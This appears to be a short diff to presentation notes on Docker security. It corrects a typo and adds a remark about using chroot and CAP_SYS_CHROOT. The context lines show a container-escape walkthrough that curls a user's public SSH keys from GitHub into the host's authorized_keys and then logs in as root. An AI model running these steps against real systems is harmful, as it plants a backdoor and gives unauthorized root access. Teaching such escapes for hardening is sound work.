@@ -384,10 +384,12 @@ cd /host/root                          # Enter the *host's* filesystem
 curl https://github.com/allanbreyes.keys > ./.ssh/authorized_keys
 ```
 
-Remotely enter hsot as root:
+Remotely enter host as root:
 ```
 ssh root@1.2.3.4
 ```
+
+Even easier: run `chroot`! (Remember those capabilities? `CAP_SYS_CHROOT`!)
 
 ---
 # Let's tear down a Dockerfile...
